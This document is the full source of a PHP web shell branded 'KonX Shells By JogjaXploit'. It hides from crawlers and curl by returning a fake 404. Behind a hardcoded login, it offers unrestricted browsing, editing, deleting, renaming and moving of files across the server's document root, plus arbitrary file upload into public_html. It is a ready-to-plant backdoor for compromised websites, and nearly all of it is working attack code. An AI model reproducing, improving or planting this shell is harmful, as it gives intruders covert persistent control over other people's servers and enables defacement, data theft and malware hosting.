<?php
// Daftar User-Agent yang akan diberikan respon 404 Not Found
$blockedUserAgents = [
    'Googlebot', 'Slurp', 'MSNBot', 'PycURL', 'facebookexternalhit',
    'ia_archiver', 'crawler', 'Yandex', 'Rambler', 'Yahoo! Slurp',
    'YahooSeeker', 'bingbot', 'curl'
];

// Mendapatkan User-Agent dari permintaan
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Memeriksa apakah User-Agent yang diterima ada dalam daftar yang diblokir
foreach ($blockedUserAgents as $blockedUserAgent) {
    if (stripos($userAgent, $blockedUserAgent) !== false) {
        // Mengatur header respon ke 404 Not Found
        header("HTTP/1.0 404 Not Found");
        echo "404 Not Found";
        exit;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>KonX Shells By JogjaXploit</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: "Lucida Console", "Courier New", monospace;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 24px;
            color: #0f0;
            text-align: center;
            position: relative;
            margin-bottom: 20px;
        }
        h1:after {
            content: " ";
            display: block;
            width: 100%;
            height: 2px;
            background: linear-gradient(to right, red, orange, yellow, green, blue, indigo, violet);
            position: absolute;
            bottom: -5px;
            left: 0;
            animation: rainbow 3s linear infinite;
        }
        @keyframes rainbow {
            0% {
                background-position: 0 50%;
            }
            100% {
                background-position: 100% 50%;
            }
        }
        .button {
            background-color: #4CAF50;
            border: none;
            color: white;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            border-radius: 5px;
        }
        .folder {
            padding-left: 20px;
        }
        input[type="file"] {
            display: inline-block;
        }
    </style>
</head>
<body>

<?php
session_start();

$validUsername = 'JogjaXploit';
$validPassword = 'Djaya3';

if (isset($_POST['username']) && isset($_POST['password'])) {
    if ($_POST['username'] === $validUsername && $_POST['password'] === $validPassword) {
        $_SESSION['loggedin'] = true;
    } else {
        echo '<div style="color: red;">Invalid username or password.</div>';
    }
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    echo '<div class="container">';
    echo '<h1>Login</h1>';
    echo '<form method="post">';
    echo 'Username: <input type="text" name="username"><br>';
    echo 'Password: <input type="password" name="password"><br>';
    echo '<input type="submit" value="Login" class="button">';
    echo '</form>';
    echo '</div>';
    exit;
}

function listDirectory($dir) {
    $files = scandir($dir);
    echo '<ul>';
    $fileCount = 0;
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $path = $dir . DIRECTORY_SEPARATOR . $file;
            echo '<li>';
            if (is_dir($path)) {
                // If it's a directory, list it and count files inside
                echo '<span class="folder" onclick="toggleFolder(this)">' . $file . '</span>';
                $fileCount += listDirectory($path);
                echo '<span>Total File: ' . $fileCount . '</span>';
            } else {
                // If it's a file, display file name, size, and creation date
                $fileSize = filesize($path);
                $fileCreationTime = filectime($path);
                echo $file . ' Size: ' . $fileSize . 'kb , Created: ' . date("Y-m-d H:i:s", $fileCreationTime);
                $fileCount++;
                echo ' <a href="?action=delete&file=' . urlencode($path) . '" class="button">Delete</a> <a href="?action=edit&file=' . urlencode($path) . '" class="button">Edit</a> <a href="?action=rename&file=' . urlencode($path) . '" class="button">Rename</a> <form method="post" style="display:inline;"><input type="hidden" name="sourceFile" value="' . htmlspecialchars($file) . '"><input type="text" name="targetDir" placeholder="Target Directory"><input type="submit" value="Move" class="button"></form>';
            }
            echo '</li>';
        }
    }
    echo '</ul>';
}

echo '<div class="container">';
echo '<h1>KonX Shells By JogjaXploit</h1>';

echo '<div><strong>Root Directory:</strong> ' . $_SERVER['DOCUMENT_ROOT'] . '</div>';

if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['file'])) {
    $fileToDelete = urldecode($_GET['file']);
    if (unlink($fileToDelete)) {
        echo '<div style="color: green;">File ' . htmlspecialchars(basename($fileToDelete)) . ' has been deleted.</div>';
    } else {
        echo '<div style="color: red;">Failed to delete file.</div>';
    }
}

if (isset($_GET['action']) && $_GET['action'] == 'edit' && isset($_GET['file'])) {
    $fileToEdit = urldecode($_GET['file']);
    echo '<h2>Edit File:</h2>';
    echo '<form method="post">';
    echo '<textarea name="fileContent" rows="10" cols="50">' . htmlspecialchars(file_get_contents($fileToEdit)) . '</textarea><br>';
    echo '<input type="hidden" name="filePath" value="' . htmlspecialchars($fileToEdit) . '">';
    echo '<input type="submit" value="Save Changes" class="button">';
    echo '</form>';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newContent = $_POST['fileContent'];
        $filePath = $_POST['filePath'];
        if (file_put_contents($filePath, $newContent)) {
            echo '<div style="color: green;">Changes saved successfully.</div>';
        } else {
            echo '<div style="color: red;">Failed to save changes.</div>';
        }
    }
}

if (isset($_GET['action']) && $_GET['action'] == 'rename' && isset($_GET['file'])) {
    $fileToRename = urldecode($_GET['file']);
    echo '<h2>Rename File:</h2>';
    echo '<form method="post">';
    echo 'New Name: <input type="text" name="newFileName" value="' . htmlspecialchars(basename($fileToRename)) . '">';
    echo '<input type="hidden" name="filePath" value="' . htmlspecialchars($fileToRename) . '">';
    echo '<input type="submit" value="Rename" class="button">';
    echo '</form>';

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newFileName = $_POST['newFileName'];
        $filePath = $_POST['filePath'];
        $newFilePath = dirname($filePath) . DIRECTORY_SEPARATOR . $newFileName;
        if (rename($filePath, $newFilePath)) {
            echo '<div style="color: green;">File renamed successfully.</div>';
        } else {
            echo '<div style="color: red;">Failed to rename file.</div>';
        }
    }
}

echo '<h2>Files:</h2>';
listDirectory($_SERVER['DOCUMENT_ROOT']);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['sourceFile']) && isset($_POST['targetDir'])) {
        $sourceFile = $_POST['sourceFile'];
        $targetDir = $_POST['targetDir'];
        $sourceFilePath = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $sourceFile;
        $targetFilePath = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $targetDir . DIRECTORY_SEPARATOR . basename($sourceFile);
        if (rename($sourceFilePath, $targetFilePath)) {
            echo '<div style="color: green;">File moved successfully.</div>';
        } else {
            echo '<div style="color: red;">Failed to move file.</div>';
        }
    }
}

echo '<h2>Actions:</h2>';
echo '<form method="post" enctype="multipart/form-data"><br>';
echo 'Select File: <input type="file" name="file" value="File To Upload"><br>'; // File selection input
echo 'Target Dir: <input type="text" name="targetDir" value="/public_html/" readonly><br>'; // Target directory input
echo '<input type="submit" value="Upload" class="button">';
echo '</form>';

// Handle file uploading and moving
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $fileTmpName = $_FILES['file']['tmp_name'];
        $fileName = basename($_FILES['file']['name']);
        $targetDir = $_POST['targetDir'];
        $uploadDirectory = $_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . $targetDir . DIRECTORY_SEPARATOR . $fileName;
        $fileSize = $_FILES['file']['size']; // Get file size
        $fileCreationTime = filectime($fileTmpName); // Get file creation time
        if (move_uploaded_file($fileTmpName, $uploadDirectory)) {
            echo '<div style="color: green;">File ' . $fileName . ' (' . $fileSize . ' bytes, created: ' . date("Y-m-d H:i:s", $fileCreationTime) . ') has been uploaded successfully to ' . $targetDir . ' directory.</div>'; // Display file size and creation time
        } else {
            echo '<div style="color: red;">There was an error uploading the file.</div>';
        }
    }
}
?>
</div>

<script>
function toggleFolder(element) {
    var ul = element.nextElementSibling;
    if (ul.style.display === "none" || ul.style.display === "") {
        ul.style.display = "block";
    } else {
        ul.style.display = "none";
    }
}
</script>

</body>
</html>
